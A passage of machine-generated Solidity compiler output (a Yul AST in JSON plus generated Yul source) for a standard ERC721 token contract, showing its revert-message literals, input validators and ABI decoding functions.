owne"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22689:6:15"},"nodeType":"YulFunctionCall","src":"22689:58:15"},"nodeType":"YulExpressionStatement","src":"22689:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22768:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22776:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22764:3:15"},"nodeType":"YulFunctionCall","src":"22764:15:15"},{"hexValue":"72206f7220617070726f766564","kind":"string","nodeType":"YulLiteral","src":"22781:15:15","type":"","value":"r or approved"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22757:6:15"},"nodeType":"YulFunctionCall","src":"22757:40:15"},"nodeType":"YulExpressionStatement","src":"22757:40:15"}]},"name":"store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22670:6:15","type":""}],"src":"22572:232:15"},{"body":{"nodeType":"YulBlock","src":"22916:131:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"22938:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"22946:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"22934:3:15"},"nodeType":"YulFunctionCall","src":"22934:14:15"},{"hexValue":"4552433732313a207472616e7366657220746f206e6f6e204552433732315265","kind":"string","nodeType":"YulLiteral","src":"22950:34:15","type":"","value":"ERC721: transfer to non ERC721Re"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22927:6:15"},"nodeType":"YulFunctionCall","src":"22927:58:15"},"nodeType":"YulExpressionStatement","src":"22927:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23006:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23014:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23002:3:15"},"nodeType":"YulFunctionCall","src":"23002:15:15"},{"hexValue":"63656976657220696d706c656d656e746572","kind":"string","nodeType":"YulLiteral","src":"23019:20:15","type":"","value":"ceiver implementer"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"22995:6:15"},"nodeType":"YulFunctionCall","src":"22995:45:15"},"nodeType":"YulExpressionStatement","src":"22995:45:15"}]},"name":"store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"22908:6:15","type":""}],"src":"22810:237:15"},{"body":{"nodeType":"YulBlock","src":"23159:118:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23181:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23189:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23177:3:15"},"nodeType":"YulFunctionCall","src":"23177:14:15"},{"hexValue":"4552433732313a207472616e736665722066726f6d20696e636f727265637420","kind":"string","nodeType":"YulLiteral","src":"23193:34:15","type":"","value":"ERC721: transfer from incorrect "}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23170:6:15"},"nodeType":"YulFunctionCall","src":"23170:58:15"},"nodeType":"YulExpressionStatement","src":"23170:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23249:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23257:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23245:3:15"},"nodeType":"YulFunctionCall","src":"23245:15:15"},{"hexValue":"6f776e6572","kind":"string","nodeType":"YulLiteral","src":"23262:7:15","type":"","value":"owner"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23238:6:15"},"nodeType":"YulFunctionCall","src":"23238:32:15"},"nodeType":"YulExpressionStatement","src":"23238:32:15"}]},"name":"store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23151:6:15","type":""}],"src":"23053:224:15"},{"body":{"nodeType":"YulBlock","src":"23389:72:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23411:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23419:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23407:3:15"},"nodeType":"YulFunctionCall","src":"23407:14:15"},{"hexValue":"4552433732313a20746f6b656e20616c7265616479206d696e746564","kind":"string","nodeType":"YulLiteral","src":"23423:30:15","type":"","value":"ERC721: token already minted"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23400:6:15"},"nodeType":"YulFunctionCall","src":"23400:54:15"},"nodeType":"YulExpressionStatement","src":"23400:54:15"}]},"name":"store_literal_in_memory_2a63ce106ef95058ed21fd07c42a10f11dc5c32ac13a4e847923f7759f635d57","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23381:6:15","type":""}],"src":"23283:178:15"},{"body":{"nodeType":"YulBlock","src":"23573:117:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23595:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23603:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23591:3:15"},"nodeType":"YulFunctionCall","src":"23591:14:15"},{"hexValue":"4552433732313a207472616e7366657220746f20746865207a65726f20616464","kind":"string","nodeType":"YulLiteral","src":"23607:34:15","type":"","value":"ERC721: transfer to the zero add"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23584:6:15"},"nodeType":"YulFunctionCall","src":"23584:58:15"},"nodeType":"YulExpressionStatement","src":"23584:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23663:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23671:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23659:3:15"},"nodeType":"YulFunctionCall","src":"23659:15:15"},{"hexValue":"72657373","kind":"string","nodeType":"YulLiteral","src":"23676:6:15","type":"","value":"ress"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23652:6:15"},"nodeType":"YulFunctionCall","src":"23652:31:15"},"nodeType":"YulExpressionStatement","src":"23652:31:15"}]},"name":"store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23565:6:15","type":""}],"src":"23467:223:15"},{"body":{"nodeType":"YulBlock","src":"23802:69:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"23824:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"23832:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"23820:3:15"},"nodeType":"YulFunctionCall","src":"23820:14:15"},{"hexValue":"4552433732313a20617070726f766520746f2063616c6c6572","kind":"string","nodeType":"YulLiteral","src":"23836:27:15","type":"","value":"ERC721: approve to caller"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23813:6:15"},"nodeType":"YulFunctionCall","src":"23813:51:15"},"nodeType":"YulExpressionStatement","src":"23813:51:15"}]},"name":"store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23794:6:15","type":""}],"src":"23696:175:15"},{"body":{"nodeType":"YulBlock","src":"23983:122:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24005:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24013:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24001:3:15"},"nodeType":"YulFunctionCall","src":"24001:14:15"},{"hexValue":"4552433732313a2061646472657373207a65726f206973206e6f742061207661","kind":"string","nodeType":"YulLiteral","src":"24017:34:15","type":"","value":"ERC721: address zero is not a va"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"23994:6:15"},"nodeType":"YulFunctionCall","src":"23994:58:15"},"nodeType":"YulExpressionStatement","src":"23994:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24073:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24081:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24069:3:15"},"nodeType":"YulFunctionCall","src":"24069:15:15"},{"hexValue":"6c6964206f776e6572","kind":"string","nodeType":"YulLiteral","src":"24086:11:15","type":"","value":"lid owner"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24062:6:15"},"nodeType":"YulFunctionCall","src":"24062:36:15"},"nodeType":"YulExpressionStatement","src":"24062:36:15"}]},"name":"store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"23975:6:15","type":""}],"src":"23877:228:15"},{"body":{"nodeType":"YulBlock","src":"24217:76:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24239:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24247:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24235:3:15"},"nodeType":"YulFunctionCall","src":"24235:14:15"},{"hexValue":"4552433732313a206d696e7420746f20746865207a65726f2061646472657373","kind":"string","nodeType":"YulLiteral","src":"24251:34:15","type":"","value":"ERC721: mint to the zero address"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24228:6:15"},"nodeType":"YulFunctionCall","src":"24228:58:15"},"nodeType":"YulExpressionStatement","src":"24228:58:15"}]},"name":"store_literal_in_memory_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24209:6:15","type":""}],"src":"24111:182:15"},{"body":{"nodeType":"YulBlock","src":"24405:68:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24427:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24435:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24423:3:15"},"nodeType":"YulFunctionCall","src":"24423:14:15"},{"hexValue":"4552433732313a20696e76616c696420746f6b656e204944","kind":"string","nodeType":"YulLiteral","src":"24439:26:15","type":"","value":"ERC721: invalid token ID"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24416:6:15"},"nodeType":"YulFunctionCall","src":"24416:50:15"},"nodeType":"YulExpressionStatement","src":"24416:50:15"}]},"name":"store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24397:6:15","type":""}],"src":"24299:174:15"},{"body":{"nodeType":"YulBlock","src":"24585:114:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24607:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24615:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24603:3:15"},"nodeType":"YulFunctionCall","src":"24603:14:15"},{"hexValue":"4552433732313a20617070726f76616c20746f2063757272656e74206f776e65","kind":"string","nodeType":"YulLiteral","src":"24619:34:15","type":"","value":"ERC721: approval to current owne"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24596:6:15"},"nodeType":"YulFunctionCall","src":"24596:58:15"},"nodeType":"YulExpressionStatement","src":"24596:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24675:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24683:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24671:3:15"},"nodeType":"YulFunctionCall","src":"24671:15:15"},{"hexValue":"72","kind":"string","nodeType":"YulLiteral","src":"24688:3:15","type":"","value":"r"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24664:6:15"},"nodeType":"YulFunctionCall","src":"24664:28:15"},"nodeType":"YulExpressionStatement","src":"24664:28:15"}]},"name":"store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24577:6:15","type":""}],"src":"24479:220:15"},{"body":{"nodeType":"YulBlock","src":"24811:142:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24833:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24841:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24829:3:15"},"nodeType":"YulFunctionCall","src":"24829:14:15"},{"hexValue":"4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f","kind":"string","nodeType":"YulLiteral","src":"24845:34:15","type":"","value":"ERC721: approve caller is not to"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24822:6:15"},"nodeType":"YulFunctionCall","src":"24822:58:15"},"nodeType":"YulExpressionStatement","src":"24822:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"24901:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"24909:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"24897:3:15"},"nodeType":"YulFunctionCall","src":"24897:15:15"},{"hexValue":"6b656e206f776e6572206f7220617070726f76656420666f7220616c6c","kind":"string","nodeType":"YulLiteral","src":"24914:31:15","type":"","value":"ken owner or approved for all"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"24890:6:15"},"nodeType":"YulFunctionCall","src":"24890:56:15"},"nodeType":"YulExpressionStatement","src":"24890:56:15"}]},"name":"store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"24803:6:15","type":""}],"src":"24705:248:15"},{"body":{"nodeType":"YulBlock","src":"25065:129:15","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"25087:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"25095:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"25083:3:15"},"nodeType":"YulFunctionCall","src":"25083:14:15"},{"hexValue":"455243373231204d657461646174613a2055524920717565727920666f72206e","kind":"string","nodeType":"YulLiteral","src":"25099:34:15","type":"","value":"ERC721 Metadata: URI query for n"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"25076:6:15"},"nodeType":"YulFunctionCall","src":"25076:58:15"},"nodeType":"YulExpressionStatement","src":"25076:58:15"},{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"25155:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"25163:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"25151:3:15"},"nodeType":"YulFunctionCall","src":"25151:15:15"},{"hexValue":"6f6e6578697374656e7420746f6b656e","kind":"string","nodeType":"YulLiteral","src":"25168:18:15","type":"","value":"onexistent token"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"25144:6:15"},"nodeType":"YulFunctionCall","src":"25144:43:15"},"nodeType":"YulExpressionStatement","src":"25144:43:15"}]},"name":"store_literal_in_memory_f5aa35d101a465871fb3c22d23c1b63312a6f81b94df7ea2d24b8a5fcbdcb02a","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nodeType":"YulTypedName","src":"25057:6:15","type":""}],"src":"24959:235:15"},{"body":{"nodeType":"YulBlock","src":"25243:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"25300:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25309:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25312:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25302:6:15"},"nodeType":"YulFunctionCall","src":"25302:12:15"},"nodeType":"YulExpressionStatement","src":"25302:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25266:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25291:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"25273:17:15"},"nodeType":"YulFunctionCall","src":"25273:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25263:2:15"},"nodeType":"YulFunctionCall","src":"25263:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25256:6:15"},"nodeType":"YulFunctionCall","src":"25256:43:15"},"nodeType":"YulIf","src":"25253:63:15"}]},"name":"validator_revert_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25236:5:15","type":""}],"src":"25200:122:15"},{"body":{"nodeType":"YulBlock","src":"25368:76:15","statements":[{"body":{"nodeType":"YulBlock","src":"25422:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25431:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25434:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25424:6:15"},"nodeType":"YulFunctionCall","src":"25424:12:15"},"nodeType":"YulExpressionStatement","src":"25424:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25391:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25413:5:15"}],"functionName":{"name":"cleanup_t_bool","nodeType":"YulIdentifier","src":"25398:14:15"},"nodeType":"YulFunctionCall","src":"25398:21:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25388:2:15"},"nodeType":"YulFunctionCall","src":"25388:32:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25381:6:15"},"nodeType":"YulFunctionCall","src":"25381:40:15"},"nodeType":"YulIf","src":"25378:60:15"}]},"name":"validator_revert_t_bool","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25361:5:15","type":""}],"src":"25328:116:15"},{"body":{"nodeType":"YulBlock","src":"25492:78:15","statements":[{"body":{"nodeType":"YulBlock","src":"25548:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25557:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25560:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25550:6:15"},"nodeType":"YulFunctionCall","src":"25550:12:15"},"nodeType":"YulExpressionStatement","src":"25550:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25515:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25539:5:15"}],"functionName":{"name":"cleanup_t_bytes4","nodeType":"YulIdentifier","src":"25522:16:15"},"nodeType":"YulFunctionCall","src":"25522:23:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25512:2:15"},"nodeType":"YulFunctionCall","src":"25512:34:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25505:6:15"},"nodeType":"YulFunctionCall","src":"25505:42:15"},"nodeType":"YulIf","src":"25502:62:15"}]},"name":"validator_revert_t_bytes4","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25485:5:15","type":""}],"src":"25450:120:15"},{"body":{"nodeType":"YulBlock","src":"25619:79:15","statements":[{"body":{"nodeType":"YulBlock","src":"25676:16:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"25685:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"25688:1:15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"25678:6:15"},"nodeType":"YulFunctionCall","src":"25678:12:15"},"nodeType":"YulExpressionStatement","src":"25678:12:15"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25642:5:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"25667:5:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"25649:17:15"},"nodeType":"YulFunctionCall","src":"25649:24:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"25639:2:15"},"nodeType":"YulFunctionCall","src":"25639:35:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"25632:6:15"},"nodeType":"YulFunctionCall","src":"25632:43:15"},"nodeType":"YulIf","src":"25629:63:15"}]},"name":"validator_revert_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"25612:5:15","type":""}],"src":"25576:122:15"}]},"contents":"{\n\n    function abi_decode_available_length_t_bytes_memory_ptr(src, length, end) -> array {\n        array := allocate_memory(array_allocation_size_t_bytes_memory_ptr(length))\n        mstore(array, length)\n        let dst := add(array, 0x20)\n        if gt(add(src, length), end) { revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() }\n        copy_calldata_to_memory(src, dst, length)\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_t_bytes4(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bytes4(value)\n    }\n\n    function abi_decode_t_bytes4_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bytes4(value)\n    }\n\n    // bytes\n    function abi_decode_t_bytes_memory_ptr(offset, end) -> array {\n        if iszero(slt(add(offset, 0x1f), end)) { revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() }\n        let length := calldataload(offset)\n        array := abi_decode_available_length_t_bytes_memory_ptr(add(offset, 0x20), length, end)\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2 {\n        if slt(sub(dataEnd, headStart), 96) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256t_bytes_memory_ptr(headStart, dataEnd) -> value0, value1, value2, value3 {\n        if slt(sub(dataEnd, headStart), 128) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := calldataload(add(headStart, 96))\n            if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }\n\n            value3 := abi_decode_t_bytes_memory_ptr(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_bool(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_bytes4(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bytes4(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_bytes4_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bytes4_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 45)\n        store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 50)\n        store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 37)\n        store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48(pos)\n        end := add(pos, 64)\n    }\n\n    function 